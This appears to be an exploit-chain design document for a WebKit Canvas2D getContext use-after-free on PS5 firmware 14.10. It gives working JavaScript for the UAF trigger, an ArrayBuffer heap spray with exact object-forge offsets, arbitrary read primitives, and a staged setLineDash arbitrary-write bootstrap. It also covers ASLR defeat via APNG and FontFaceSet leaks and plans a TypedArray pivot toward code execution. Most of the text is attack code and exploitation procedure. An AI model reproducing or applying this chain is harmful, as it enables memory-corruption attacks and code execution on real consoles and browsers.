# Canvas2D `getContext` UAF — Corrected Getter→Write Chain (PS5 14.10 / WebKit)

**Status:** design document. Supersedes the Canvas2D segment of chain v4/v5 and probes V871–V876.
**Corrected inputs (authoritative for this document):** `ArrayBuffer(752)` reclaim; `m_stateStack` at `+120` (0x78); `m_size` at `+128` (0x80); `m_capacity` at `+132` (0x84); `m_canvas` at `+32`; CallTracer bool at `+28`; CRC2D class 768 B; Gigacage OFF; DAZ ON; **one `triggerUAF` per page**.

**What this document fixes beyond the two known bugs**

1. It gives an exact, byte-level forge for an `ArrayBuffer(752)` and the exact State layout the getters dereference.
2. It answers the “is 0.0 proof?” question with a *discriminating* signature, and proves that a destructor-null `m_buffer` faults — it does not return 0.0.
3. It shows the in-place `DataView` rewrite of `m_buffer` (no second UAF) and gives exact read recipes.
4. It **corrects** the “`m_buffer = target − 168`” write idea, which does not work as stated, and replaces it with a two-stage `Vector<double>` bootstrap that needs no AB address and no CRC2D vtable.
5. It flags the `m_canvas = NULL` rule as phase-dependent: NULL is correct for the getter/GC phase, but every Canvas2D setter dereferences `m_canvas` through `canvasBase().drawingContext()`. The write phase needs a real `HTMLCanvasElement *`.
6. It derives the post-`m_stateStack` offsets (notably `m_unrealizedSaveCount`), which shift by `+8` with the corrected `+120` base. The old `+592` is wrong for this layout; the derived value is `+600`, with calibration.

Legend: **[PROVEN]** = device or source evidence already in the repo; **[DERIVED]** = arithmetic/source consequence, needs one device gate; **[PROPOSED]** = new design step, must be validated by the probe in §10.

---

## 0. Quick answers to the five questions

### Q1 — Does `lineWidth == 0.0` prove the forge worked?

**No, 0.0 alone is not proof. The all-zero *State signature* is proof.** A destructor-null `m_buffer` does not produce 0.0; it produces a fault:

- `~Vector` calls `VectorBufferBase::deallocateBuffer()`, which sets `m_buffer = nullptr`, `m_capacity = 0`, but leaves `m_size` unchanged. With `m_size == 1`, `last()` is `m_buffer[0]`, so `lineWidth()` reads address `0 + 48 = 48` → SIGSEGV. With `m_size > 1`, it faults at `(size−1)*448 + 48`. It never returns 0.0.
- If the state stack was inline (`m_size == 1`, `m_buffer == X+136`), the destructor does **not** null the pointer (the inline buffer is skipped), so a non-reclaimed context returns the inline `lineWidth`, which is **1.0** by default, not 0.0.
- A zeroing reclaimer that leaves `m_buffer` pointing at a zeroed inline State could produce 0.0, but the AB path cannot: `ArrayBuffer(752)` is zero-filled, so `m_buffer` becomes 0, not `X+136`.

The proof is the **full zero-page fingerprint**, which no default `State` produces:

| Getter | Zero-page forge | Real default `State` |
|---|---|---|
| `lineWidth` | `0.0` | `1.0` |
| `globalAlpha` | `0.0` | `1.0` |
| `miterLimit` | `0.0` | `10.0` |
| `lineDashOffset` | `0.0` | `0.0` (same) |
| `getTransform()` | `a=b=c=d=e=f=0` (**zero matrix**) | `1,0,0,1,0,0` (identity) |
| `getLineDash()` | `[]` | `[]` (same) |
| `imageSmoothingEnabled` | `false` | `true` |

The `getTransform()` result is the discriminator: the all-zero matrix is not a valid default and is not produced by the Canvas2D constructor. The `lineDashOffset` and `getLineDash` rows are non-discriminating and are listed only for completeness.

A single 0.0 can also be DAZ flushing a subnormal pointer read, or a legitimate `lineWidth = 0`; neither applies to this page. **Do not proceed past Q1 on `lineWidth == 0.0` alone.**

### Q2 — How do we read arbitrary addresses?

**By rewriting the live `m_stateStack.m_buffer` in the winning AB with `DataView.setBigUint64(120, A − 48, true)` and calling a getter. No second UAF is needed, and no re-trigger is allowed.**

The winner is the AB that reclaimed the freed 768 B CRC2D slot. If its `DataView` is still alive (keep every AB and view referenced), the bytes at AB offset 120 *are* the live CRC2D's `m_stateStack.m_buffer`. Writing them changes what `state()` returns on the next getter. This is a true in-place UAF write, not a respray.

- `lineWidth()` reads 8 bytes at `m_buffer + 48` (because `m_size == 1` ⇒ `last() == m_buffer[0]`). Set `m_buffer = A − 48` to read 8 bytes at `A`.
- `globalAlpha()` reads 8 bytes at `m_buffer + 56`; set `m_buffer = A − 56`.
- `getTransform()` reads 48 bytes at `m_buffer + 112`; set `m_buffer = A − 112` to read `A .. A+40` as six doubles.
- `lineDashOffset()` reads 8 bytes at `m_buffer + 184`; set `m_buffer = A − 184`.

The read primitive does **not** require a valid `State` at `A − 48`; it only requires `A` to be mapped, because the getter loads the field and returns. It also does not require a valid `m_canvas` (getters do not call `drawingContext()`).

If the winner is not yet known, update **all** ABs' offset 120 to the same value; the live one is updated too. Once the winner is identified (§5.4), update only its `DataView` for speed.

### Q3 — Does `m_buffer = target − 168` write at `target`?

**No. That construction is wrong, and it is the most likely reason the previous write attempts “looked aimed” but landed nowhere.**

`m_stateStack.m_buffer` is the **State base** `S`. `setLineDash()` does:

```
modifiableState().lineDash = dash;   // Vector<double> copy-assign
```

The destination vector is a 16-byte header at `S + 168`:

| State offset | Field |
|---|---|
| `S+168` | `lineDash.m_buffer` (pointer to the destination) |
| `S+176` | `lineDash.m_size` |
| `S+180` | `lineDash.m_capacity` |

Setting `m_buffer = T − 168` makes `S = T − 168`, so the destination pointer is read from `S + 168 = T`, i.e. **the first 8 bytes at `T`**. It does not become `T`; it becomes `*(T)`. Unless `*(T) == T` (a self-pointer), the copy goes somewhere else. The three header fields must be *written into controlled memory*, not aimed at by subtracting 168.

The correct construction is two-level:

1. A controlled State buffer `S` at a **known address**, containing `{T, n, n}` at `S+168`.
2. `m_buffer = S`, then `setLineDash(dash)` with `dash.length == n` (even) writes the `n` doubles to `T`.

The hard part is step 1: a controlled buffer at a known address. §6.3 gives a bootstrap that obtains one with the UAF write itself (the **Vector-buffer two-stage**), without knowing the AB address and without a CRC2D vtable.

### Q4 — TypedArray pivot

Once the write primitive is live, overwrite a `BigUint64Array`/`Float64Array` cell's `m_vector` and `m_length` with `setLineDash`. The JSC layout in the local tree is `m_vector` at cell `+24`, `m_length` at `+32` (not `+16/+24`); the device build may use the older layout. §7 gives both, the discovery scan, and the `CagedPtr` caveat. The pivot turns the write primitive into unrestricted 64-bit JS R/W, which then removes the DAZ/NaN/subnormal restrictions for the code-execution phase.

### Q5 — ASLR integration

Use the APNG overread to derive the module base (`module_base = leak − 0x7850`, validated by the ELF magic at `module_base`), and the FontFaceSet UAF to get a JSC-heap pointer (`0x10_xxxxxxxx`). The forge bytes are written **after** the leaks, because the AB is allocated after the UAF and its bytes can be filled immediately. The chain order is:

```
APNG (module base + candidate heap pointers)
  → FontFaceSet (JSC heap pointer)
  → Canvas UAF (free 768 B)
  → AB(752) spray + forge (m_buffer, m_canvas, size/cap, saveCount)
  → getter proof
  → read primitive (ELF parse → BSS scratch; APNG candidates → canvas pointer)
  → Vector-buffer bootstrap (stage A/B) → write primitive
  → TypedArray pivot
```

The module base is not needed for the getters or the write; it is needed to find a writable BSS scratch slot for stage A and later for code pointers.

---

## 1. Corrected object model

### 1.1 CRC2DBase / CRC2D layout (768 B class)

The device build's `Vector` field order is **`{ptr, size, capacity}`** (the user-supplied `m_size +128`, `m_capacity +132` confirm it). The newer upstream tree declares `{ptr, capacity, size}`; do **not** use the upstream order for the device forge. The table below uses the device order.

| Offset | Size | Field | Forge (read phase) | Notes |
|---:|---:|---|---|---|
| `+0` | 8 | primary vptr (`CanvasRenderingContext`) | `0` | Never touched by getters. Do **not** put a magic here until the save path is proven non-virtual on the console build. |
| `+8` | 20 | `CanvasRenderingContext` refcount/checked-ptr/fields | `0` | Do not touch. |
| `+28` | 1 | `m_hasActiveInspectorCanvasCallTracer` | **`0`** | If 1, the binding calls `recordAction` with a null tracer → crash. This is the CallTracer fix. |
| `+29` | 3 | padding | `0` | |
| `+32` | 8 | `m_canvas` (`CanvasBase&`) | **`0`** in getter phase; `canvas_ptr` in write phase | GC-safe as NULL (`addOpaqueRoot(nullptr)` returns false). **Setters deref it**; see §6.4. |
| `+40` | 8 | secondary vptr (`CanvasPath`) | `0` | Only needed if path ops are used; the primary chain avoids them. |
| `+48` | ~64 | `Path m_data` (`std::variant`) | `0` (monostate) | Path ops are **not** used in the primary chain (they virtual-call `hasInvertibleTransform`). |
| `+112` | 8 | padding | `0` | |
| `+120` | 8 | `m_stateStack.m_buffer` | `STATE_BASE` | **Corrected offset.** |
| `+128` | 4 | `m_stateStack.m_size` | **`1`** | Must be exactly 1. `size == 0` → `last()` indexes `0xFFFFFFFF` → `CrashOnOverflow`, not a memory read. |
| `+132` | 4 | `m_stateStack.m_capacity` | **`1`** | |
| `+136` | 448 | inline `State[0]` | `0` | Unused when `m_buffer` is external. If `m_buffer` ever points here, these bytes are the State. |
| `+584` | 16 | `m_dirtyRect` (`FloatRect`) | `0` | |
| `+600` | 4 | `m_unrealizedSaveCount` | **`0`** | **Derived** from `+120 + 16 (Vector) + 448 (State) + 16 (dirtyRect)`; old `+592` is `+8` off. Calibrate. |
| `+604` | 1 | `m_usesCSSCompatibilityParseMode` | `0` | |
| `+605` | 1 | `m_usesDisplayListDrawing` | `0` | Keep 0; the display-list branch is not used. |
| `+606` | 2 | padding | `0` | |
| `+608` | 8 | `m_recordingContext` (`unique_ptr`) | `0` | |
| `+616` | ~24 | `m_suppliedColors` (`HashSet`) | `0` | Do not corrupt; it participates in destruction paths. |
| `+640` | ~64 | `m_cachedImageData` (`optional`) | `0` | |
| `+704` | ~40 | `m_settings` + slack | `0` | `getContextAttributes()` is a safe optional oracle if calibrated. |
| `+736` | 16 | **AB tag** (slack) | unique 128-bit tag | For “is this AB live?” scans; keep below `+752`. |

**AB size choice.** `ArrayBuffer(752)` gives a 768 B allocator class with 16 B of allocator slack, so offsets `+752..+767` are **not addressable** through the `DataView`. Never place a field you need above `+751`. Do not switch to `ArrayBuffer(768)`; the class-768 evidence (V542/V821/V818) is tied to the 752 B backing.

### 1.2 `m_stateStack` (`Vector<State, 1>`) at `+120`

| Offset | Size | Field | Device value |
|---:|---:|---|---|
| `+120` | 8 | `m_buffer` | forge-controlled |
| `+128` | 4 | `m_size` | `1` |
| `+132` | 4 | `m_capacity` | `1` |
| `+136` | 448 | inline `State[0]` | unused in this chain |

`state()` is `m_stateStack.last()`; with `size == 1`, `last()` is `m_buffer[0]`. The State **stride is 448**, not 400 (V767v2 measured `sizeof(State) == 0x1C0` on the same target). Keep `size == 1` permanently so the stride never matters.

### 1.3 State layout (relative to `m_stateStack.m_buffer`)

| Offset | Size | Field | Fake value | Why |
|---:|---:|---|---|---|
| `+0` | 8 | `unparsedStrokeColor` (`String`) | `0` | Null `StringImpl` is safe. |
| `+8` | 8 | `unparsedFillColor` (`String`) | `0` | |
| `+16` | 8 | `strokeStyle` (`CanvasStyle` index/payload) | `0` | Variant index 0 = Color; **never 2/3** (Gradient/Pattern), which would deref a RefPtr during any state visitation/destruction. |
| `+24` | 8 | `strokeStyle` payload | `0` | |
| `+32` | 8 | `fillStyle` index/payload | `0` | Same index rule. |
| `+40` | 8 | `fillStyle` payload | `0` | |
| `+48` | 8 | **`lineWidth` (double)** | marker (e.g. `1234.5`) | Read via `lineWidth()`. |
| `+56` | 8 | **`globalAlpha` (double)** | marker (e.g. `0.5`) | Read via `globalAlpha()`. |
| `+64` | 48 | `lineCap`/`lineJoin`/`miterLimit`/shadow | `0` | Not read by the chain. |
| `+112` | 48 | **`transform` (6 doubles)** | `1,0,0,1,0,0` (or markers) | Read via `getTransform()`. |
| `+160` | 1 | `hasInvertibleTransform` | `1` (if path ops are ever used) | Path ops call a **virtual** `hasInvertibleTransform()`; see §1.4. |
| `+161` | 7 | padding | `0` | |
| `+168` | 8 | **`lineDash.m_buffer`** | `T` (write target) | The destination pointer. |
| `+176` | 4 | **`lineDash.m_size`** | `n` (even, ≥2) | Must match the `setLineDash` array length. |
| `+180` | 4 | **`lineDash.m_capacity`** | `n` (≥ size) | If `< n`, `Vector::operator=` reallocates and writes elsewhere. |
| `+184` | 8 | `lineDashOffset` | `0.0` | |
| `+192` | 32 | flags/text enums | `0` | |
| `+224` | 8 | `FontProxy` vptr | `0` | The State is never destroyed; 0 is acceptable. If a font getter is called, this would matter — do not call one. |

**Critical GC note (this build):** the local tree's `JSCanvasRenderingContext2D::visitAdditionalChildren` only adds `wrapped().canvas()` as an opaque root; it does **not** iterate the state stack. The `CanvasStyle` index rule is defense-in-depth for older builds that did. `addOpaqueRoot(nullptr)` returns false without dereferencing, so `m_canvas == 0` is safe for GC. `addOpaqueRoot(non_null)` hashes the pointer without dereferencing, so a real canvas pointer is also GC-safe.

### 1.4 The zero-vtable trap (why the primary chain avoids path ops)

`CanvasPath::moveTo()` calls `hasInvertibleTransform()`, a **virtual** function overridden by `CanvasRenderingContext2DBase` as `state().hasInvertibleTransform`. With the AB's vptr at `+0` (and the `CanvasPath` secondary vptr at `+40`) zeroed, that virtual call dereferences a null vtable and crashes. The same applies to any other virtual method on the context. Consequences:

- Do **not** use `moveTo`/`lineTo`/`rect`/`arc` on the forged context to “self-leak” a `PathImpl` unless a valid `CanvasPath` vtable is installed first. That is a separate project (the CRC2D vtable RVA is still an open item).
- The primary chain uses **only** non-virtual members: `lineWidth`, `globalAlpha`, `getTransform`, `getLineDash`, `setLineDash`. `setLineDash` is a non-virtual member of `CanvasRenderingContext2DBase`; it calls `realizeSaves()` (no-op at count 0), `modifiableState()` (non-virtual), `Vector::operator=` (non-virtual), and `applyLineDash()` → `drawingContext()` → **virtual on `m_canvas`**, which is a real canvas with a valid vtable.
- `save()` is a plausible reclaim oracle only if the console build's `save()` is non-virtual and the tracer bool is 0. V843 crashed with a string whose `+28` byte was 1; that is consistent with the tracer, not necessarily with a virtual `save()`. Treat `save()` as an **optional** gate, not the primary oracle. The primary oracle is the BSS-slot `getLineDash` test in §5.4, which uses no `save()` and no `this` vtable.

---

## 2. Phase 0 — leaks and prerequisites

### 2.1 Beacon pool

Create **≥1200** `Image` objects before any critical step and keep them alive. All beacons use `sendBeacon` with an `Image().src` fallback. Do not allocate large objects between the UAF free and the forge fill.

### 2.2 APNG module-base leak

Load the malformed/oversized APNG, draw it to a normal (non-UAF) 2D canvas, `getImageData`, strip alpha, and scan the RGB bytes for 8-byte pointer-shaped values:

- Heap candidates: high 32 bits in the `0x00000008..0x00000010` range, low bits plausible, 8-byte aligned.
- Module candidates: a value equal to `module_base + 0x7850`; derive `module_base = value − 0x7850`.
- Validate: `module_base` is page-aligned; `read64(module_base) == 0x00010102464C457F` (ELF64 magic). If the magic check fails, try the deterministic 14.10 base from the cold-boot map; if both fail, abort before the UAF.

The APNG scan also provides the **canvas candidates** used in §5.5. Create 200+ `canvas` elements (no contexts) **before** the APNG decode so their `HTMLCanvasElement` objects can appear in the overread.

### 2.3 FontFaceSet UAF leak

Use the `FontFace.prototype.then` getter + `document.fonts.load()` reentry to free a `CSSFontFace` and reclaim it with an 86-char UTF-16 string. The leak yields a JSC-heap pointer (`m_wrapper`, `0x0000001000xxxxxx`) and a second pointer. This is the anchor for the JSC block scan in §7 and a second read anchor. It is **not** required for the getter proof or the write primitive.

### 2.4 Mapped VA map

The cold-boot-proven mapped VAs (3/3 boots) are:

```
0x0000000800000000   0x0000001000000000   0x0000002000000000
0x0000008000000000   0x0000010000000000   0x0000040000000000
0x0000100000000000   0x0000400000000000   0x0000600000000000
0x00007f0000000000
```

Use one as the initial `m_stateStack.m_buffer` for the getter proof. The list is **mapped-zero** for the tested boots; do not assume it is writable. The write bootstrap uses a writable BSS slot derived from the module ELF, not these VAs.

---

## 3. Phase 1 — UAF trigger, AB spray, forge

### 3.1 Trigger (single, never repeated)

```js
const oc = document.createElement('canvas');
oc.width = 1; oc.height = 1;
let stale = null;
const opts = {};
Object.defineProperty(opts, 'alpha', {
  configurable: true,
  get() {
    // Inner 2D context is created and installed while the outer getContext
    // is still doing dictionary conversion.
    stale = oc.getContext('2d');
    return true;
  }
});
oc.getContext('bitmaprenderer', opts);   // outer creation replaces m_context → frees the 2D CRC2D
// stale is now a dangling JSCanvasRenderingContext2D → freed 768 B CRC2D
```

Notes:

- The `defineProperty` is on the **options object**, not `HTMLCanvasElement.prototype`. The reentrancy is the whole bug.
- Do not call `triggerUAF` again on the page. Every subsequent primitive rewrites the **same** AB in place.
- Do not drop `oc`; the canvas element must stay alive so `m_canvas` targets remain valid.

### 3.2 Spray and forge

Allocate `N = 128` `ArrayBuffer(752)` objects after the free. The first allocation after the free has the highest probability of taking the 768 B free-list head; the rest are decoys. For each AB, immediately create a `DataView` and write the forge. Keep both alive in arrays.

```js
const AB_SIZE = 752;
const OFF_TRACER      = 28;
const OFF_CANVAS      = 32;
const OFF_STACK_BUF   = 120;
const OFF_STACK_SIZE  = 128;
const OFF_STACK_CAP   = 132;
const OFF_SAVE_COUNT  = 600;

const abs = [], dvs = [];
for (let i = 0; i < 128; i++) {
  const ab = new ArrayBuffer(AB_SIZE);
  const dv = new DataView(ab);
  dv.setUint8(OFF_TRACER, 0);                 // CallTracer = 0
  dv.setBigUint64(OFF_CANVAS, 0n, true);      // NULL for getter/GC phase
  dv.setBigUint64(OFF_STACK_BUF, INITIAL_VA, true); // e.g. 0x800000000n
  dv.setUint32(OFF_STACK_SIZE, 1, true);
  dv.setUint32(OFF_STACK_CAP, 1, true);
  dv.setUint32(OFF_SAVE_COUNT, 0, true);      // derived +600, NOT +592
  // unique tag in the last 16 addressable bytes
  dv.setBigUint64(736, 0x4142434445460000n | BigInt(i), true);
  dv.setBigUint64(744, 0xfeedfacecafebeefn, true);
  abs.push(ab); dvs.push(dv);
}
```

**Forge table (AB offsets, read phase):**

| AB offset | Size | Value | Reason |
|---:|---:|---|---|
| `0..27` | 28 | `0` | vptr/tracer/refcount region |
| `28` | 1 | `0` | CallTracer |
| `32` | 8 | `0` | `m_canvas = NULL` (getter phase) |
| `40..119` | 80 | `0` | CanvasPath/Path/padding |
| `120` | 8 | `INITIAL_VA` | `m_stateStack.m_buffer` |
| `128` | 4 | `1` | `m_size` |
| `132` | 4 | `1` | `m_capacity` |
| `136..583` | 448 | `0` | unused inline State |
| `584..599` | 16 | `0` | `m_dirtyRect` |
| `600` | 4 | `0` | `m_unrealizedSaveCount` |
| `604..735` | 132 | `0` | flags/containers/settings |
| `736..751` | 16 | tag | AB identification |

**Do not** write `+0` with a magic before the save path is proven non-virtual. If a console `save()`/binding does a virtual call on the context, a non-zero vptr into non-code memory crashes earlier than the tracer would.

### 3.3 Reclaim gate

Do not use `save()` as the first action. The first action is the getter proof (§4). If the AB did not reclaim, the getter faults; there is no safe retry in the same page. Maximize the probability by:

- Allocating the ABs immediately after the free, with no intervening 768-class allocation.
- Filling each AB immediately after allocation (no logging, no large JS objects).
- Keeping `N` high enough (128) but not so high that the critical window allocates unrelated 768-class objects.

---

## 4. Phase 2 — getter proof (Q1)

### 4.1 What `state()` actually does

`CanvasRenderingContext2DBase.h`:

```cpp
const State& state() const { return m_stateStack.last(); }
```

`Vector::last()` is `at(size() - 1)`. With `size == 1`, this is `m_buffer[0]`; `lineWidth()` is `state().lineWidth`, i.e. a load at `m_buffer + 48`. There is no `m_canvas` access in `lineWidth`, `globalAlpha`, `getTransform`, `getLineDash`, or `lineDashOffset`.

### 4.2 Fire the proof

```js
function probe() {
  const out = {};
  out.lineWidth  = stale.lineWidth;
  out.globalAlpha = stale.globalAlpha;
  out.miterLimit = stale.miterLimit;
  out.lineDashOffset = stale.lineDashOffset;
  out.imageSmoothingEnabled = stale.imageSmoothingEnabled;
  const m = stale.getTransform();
  out.transform = [m.a, m.b, m.c, m.d, m.e, m.f];
  out.dash = stale.getLineDash();
  return out;
}
```

### 4.3 Pass/fail table

| Observation | Meaning | Action |
|---|---|---|
| `lineWidth == 0.0`, `globalAlpha == 0.0`, transform `[0,0,0,0,0,0]`, dash `[]` | Zero-page forge live; AB reclaimed; `m_buffer` write landed | Proceed to §5 |
| `lineWidth == 1.0`, transform identity | Inline State; AB did not reclaim or `m_buffer` was not overwritten | Abort; re-check class/spray order/offset |
| Fault at the first getter | `m_buffer` unmapped, `m_size == 0`, or AB did not reclaim | Abort; check VA mapping and `+128/+132` order |
| `lineWidth == 0.0` but transform identity | Not our zero State (a real State with `lineWidth=0`?) | Abort; do not trust a single 0.0 |
| Dash returns values not `[]` | `m_buffer` is not the intended VA, or State+168 is non-zero | Abort; re-check `+120` and VA |

**Why the all-zero transform matters:** `getTransform()` is `DOMMatrix::create(state().transform.toTransformationMatrix(), Is2D::Yes)`. A default `State` has an identity transform; only a zeroed 448 B region gives `[0,0,0,0,0,0]`. This is the cheapest discriminator against “the inline State survived” and “the getter returned a cached/default value”.

### 4.4 DAZ caveat

The proof values are `0.0` and `false`, so DAZ does not affect them. The DAZ risk starts in §5 when a heap pointer is read as a double. The rule:

- Store the returned double into a `Float64Array` **immediately** and read the bits from a `BigUint64Array` over the same buffer.
- Do not compare, add, or `Math.*` the value before the store.
- A positive heap pointer (`0x0000_0008...` / `0x0000_0010...`) is a positive subnormal; `jsNumber` boxes it without arithmetic and preserves the bits. If a calibration read returns 0, the build normalizes subnormals somewhere in the binding; fall back to the XOR-transport note in §6.6.

---

## 5. Phase 3 — arbitrary read (Q2)

### 5.1 The in-place rewrite

```js
const f64 = new Float64Array(1);
const u64 = new BigUint64Array(f64.buffer);

function setMBufferAll(v) {                 // v: BigInt
  for (let i = 0; i < dvs.length; i++)
    dvs[i].setBigUint64(OFF_STACK_BUF, v, true);
}
function setMBufferOne(i, v) {
  dvs[i].setBigUint64(OFF_STACK_BUF, v, true);
}
function read64(A) {                        // A: BigInt
  setMBufferAll(A - 48n);
  f64[0] = stale.lineWidth;                 // no arithmetic
  return u64[0];
}
function read48(A) {                        // A: BigInt, 48 bytes
  setMBufferAll(A - 112n);
  const m = stale.getTransform();
  f64[0] = m.a; f64[1] = m.b; f64[2] = m.c;
  f64[3] = m.d; f64[4] = m.e; f64[5] = m.f;
  return u64.slice();                       // six 8-byte words
}
```

If the winner is unknown, `setMBufferAll` is correct: every AB gets the new pointer, and the live one is among them. Once §5.4 identifies the winner `k`, replace `setMBufferAll` with `setMBufferOne(k, ...)` for speed.

### 5.2 Read recipes

| Getter | `m_buffer` | Bytes returned | Notes |
|---|---|---|---|
| `lineWidth` | `A − 48` | `A .. A+7` | Fastest 8-byte read |
| `globalAlpha` | `A − 56` | `A .. A+7` | Independent alignment; cross-check |
| `getTransform` | `A − 112` | `A .. A+40` (48 B) | Six doubles; best bulk read |
| `lineDashOffset` | `A − 184` | `A .. A+7` | Another independent 8-byte read |
| `imageSmoothingEnabled` | `A − off` | 1 byte as bool | Only if the State offset is calibrated |

`getLineDash()` is **not** an arbitrary-read primitive: it interprets the target's `+8` bytes as a vector size, and a bad size crashes or reads a huge array. Do not use it for probing.

### 5.3 What to read first

1. **ELF header at `module_base`** — validate the APNG-derived base. Read `read64(base)`, expect `0x00010102464C457F`.
2. **Program headers** — find a writable `PT_LOAD` (`p_type == 1`, `p_flags & 2`) with a large `p_memsz` (BSS). Choose `W`, a 0x100-aligned, 64 KB region near the end of that segment. Verify `read64(W) == 0` and `read64(W + 0x1000) == 0` before using it. `W` is the scratch state base for §6.
3. **APNG candidates** — read `read64(C)` for each candidate `C`; group by the value. A real C++ object's first word is a module `.data.rel.ro` vtable pointer. The vtable shared by many of the 200+ canvases is the `HTMLCanvasElement` vtable candidate. Pick one `C` with that vtable and `read64(C + contextOffset) == 0` if the offset is calibrated; otherwise accept the group winner and keep the canvas alive.
4. **FontFace pointer** — read `read64(P_jsc)` and the surrounding block for the typed-array scan (§7).

### 5.4 Winner identification without `save()` (BSS-slot oracle)

This is the primary reclaim/winner oracle. It uses only `setLineDash` (non-virtual on the context) and `getLineDash` (non-virtual), and it doubles as the first write-stage test.

1. Reserve `N` distinct 0x100-byte slots `W_0 .. W_{N-1}` in the writable BSS region (verify zero).
2. For each AB `i`, set `m_buffer = W_i`, `m_canvas = canvas_ptr`, `size = 1`, `cap = 1`, `saveCount = 0`.
3. Call `stale.setLineDash(dashA)` once, with `dashA.length = 64`, all finite and ≥ 0.
   The live AB (index `k`) uses `m_buffer = W_k`; its destination vector at `W_k + 168` is zero, so `Vector::operator=` allocates a 512-byte buffer `B`, writes `B` to `W_k + 168`, and copies `dashA` into `B`.
4. For each `i`, set **all** ABs' `m_buffer = W_i`, then call `stale.getLineDash()`:
   - If `i == k`, `state().lineDash` is `{B, 64, 64}` → returns 64 doubles.
   - If `i != k`, `W_i + 168` is still zero → returns `[]`.
   The first `i` with length 64 is `k`.
5. Read `B`: set only AB `k`'s `m_buffer = W_k + 120`; `lineWidth` reads 8 bytes at `W_k + 168` = `B`. Store immediately into `f64`/`u64`; `B` is a positive subnormal and should survive boxing.
6. Verify `B` is a plausible fastMalloc pointer: high 32 bits in the heap range, 8-byte aligned, nonzero.

Cost: `N` update-all passes plus `N` getters, then one read. For `N = 128`, trivial.

If step 4 never returns 64:

- `W` is not writable, or `setLineDash` returned before the copy (validation failed, tracer called `recordAction`, or a virtual call on the zero vtable), or the canvas pointer is invalid.
- Do not retry with a different `W` in the same page if `setLineDash` may have crashed; a beacon gap tells you it crashed.

### 5.5 If the APNG leak has no canvas

The write phase absolutely needs a valid `CanvasBase` for `drawingContext()`. Three options, in order:

1. **APNG vtable grouping** (above) — preferred.
2. **JSC wrapper block scan** — the FontFace leak gives a JSCell in the JSC MarkedSpace. Align down to the 16 KB block, read the block with `read48`, and look for a `JSCanvasElement` wrapper whose `m_wrapped` points to a fastMalloc object with a module vtable and a null `m_context`. This is the same block-scan machinery as §7.
3. **Abort.** Do not substitute a random heap pointer for `m_canvas`: `canvasBase().drawingContext()` is a virtual call, and a wrong vtable crashes.

---

## 6. Phase 4 — arbitrary write (Q3)

### 6.1 What `setLineDash` actually does (source order)

```cpp
void CanvasRenderingContext2DBase::setLineDash(const Vector<double>& dash)
{
    if (!lineDashSequenceIsValid(dash))   // all finite and >= 0
        return;
    realizeSaves();                       // no-op if m_unrealizedSaveCount == 0
    modifiableState().lineDash = dash;    // Vector<double> copy-assign
    if (dash.size() % 2)                  // odd → appendVector (may realloc)
        modifiableState().lineDash.appendVector(dash);
    applyLineDash();                      // drawingContext() virtual on m_canvas
}
```

`Vector::operator=` (WTF):

```cpp
if (size() > other.size()) shrink(other.size());
else if (other.size() > capacity()) { clear(); reserveCapacity(other.size()); }
std::copy_n(other.begin(), size(), begin());
TypeOperations::uninitializedCopy(other.begin() + size(), other.end(), end());
m_size = other.size();
```

So:

- If `other.size() <= capacity`, the copy is **in place** to `lineDash.m_buffer` = `T`. This is the write.
- If `other.size() > capacity`, it reallocates, writes the new buffer pointer into `S+168`, and copies to the new buffer — **not** to `T`.
- If `dash.size()` is odd, `appendVector` runs after the copy and may reallocate/double the vector. **Use an even length.**
- `realizeSaves()` must be a no-op: `m_unrealizedSaveCount` at `+600` must be 0. If it is nonzero, `realizeSavesLoop()` calls `drawingContext()` and appends states, which will write 448-byte States through `m_buffer` and likely crash. Reset the count with `restore()` (which decrements without touching `m_canvas`) or with the `DataView` at `+600`.

### 6.2 The fake State buffer must be controlled

`setLineDash` reads three fields at `S+168..S+183`. `S` must therefore be memory we control:

| Requirement | Value |
|---|---|
| `S` known address | from the Vector-buffer bootstrap (§6.3) |
| `S+168` | `T` (target address) |
| `S+176` | `n` (even, ≥2) |
| `S+180` | `n` (≥ size) |
| `S+160` | `1` if any path op is used; otherwise irrelevant |
| `S+0..47` | `0` (safe CanvasStyle indices) |
| `S+48`, `S+56`, `S+112..159` | optional markers for verification |

### 6.3 Vector-buffer two-stage bootstrap (the missing link)

This obtains a controlled State buffer at a **known address** using only `setLineDash`, without the AB address and without a CRC2D vtable.

**Preconditions:** a writable BSS slot `W` (zero), a real `canvas_ptr`, winner `k` known.

**Stage A — allocate a controlled vector buffer `B` and leak its address**

1. `dv[k].setBigUint64(120, W, true)`; set `m_canvas = canvas_ptr`; `size = 1`, `cap = 1`, `saveCount = 0`.
2. `stale.setLineDash(dashA)` with `dashA.length = 64`, finite, ≥0.
   `W+168` is zero, so the assignment allocates `B` (512 B), writes `B` to `W+168`, sets `size=64`, `cap=64`, and copies `dashA` into `B`.
3. `dv[k].setBigUint64(120, W + 120n, true)`; read `B = bits(stale.lineWidth)`.
   (`lineWidth` at `W+120+48 = W+168`.)
4. If `B` is not a plausible heap pointer, stage A failed: `W` not writable, `setLineDash` rejected the dash, `m_canvas` invalid, or the winner was wrong. Abort.

**Stage B — fill `B` with a fake State**

`W+168` now holds `{B, 64, 64}`. Call `stale.setLineDash(dashB)` with `dashB.length = 64`, where `dashB` is the 64-double image of the State at `B`:

| `dashB` index | Byte offset | Value |
|---:|---:|---|
| 0..5 | 0..47 | `0.0` (safe CanvasStyle indices) |
| 6 | 48 | `lineWidth` marker (e.g. `1234.5`) |
| 7 | 56 | `globalAlpha` marker (e.g. `0.5`) |
| 8..13 | 64..111 | `0.0` |
| 14..19 | 112..159 | transform `1,0,0,1,0,0` |
| 20 | 160 | bits `0x0000000000000001` (byte 0 = 1; finite, positive subnormal) |
| 21 | 168 | `T` (target address as a double; positive userland pointer) |
| 22 | 176 | bits `0x0000000200000002` (size=2 at low 4 B, capacity=2 at high 4 B) |
| 23 | 184 | `0.0` |
| 24..27 | 192..223 | `0.0` |
| 28 | 224 | `0.0` (FontProxy vptr) |
| 29..63 | 232..511 | `0.0` |

Because `W+168` has capacity 64 and `dashB.length == 64`, the copy is in place to `B`; `B` now contains the fake State.

**Stage C — write to `T`**

1. `dv[k].setBigUint64(120, B, true)`.
2. Verify: `stale.lineWidth == dashB[6]`, `stale.globalAlpha == dashB[7]`, `stale.getTransform()` = `dashB[14..19]`.
3. `stale.setLineDash(dashC)` with `dashC.length = 2` (even), `dashC[0] = doubleFromBits(value0)`, `dashC[1] = doubleFromBits(value1)`.
   The State at `B` has `lineDash = {T, 2, 2}`; the copy writes 16 bytes to `T`.
4. Verify with `read64(T)`.

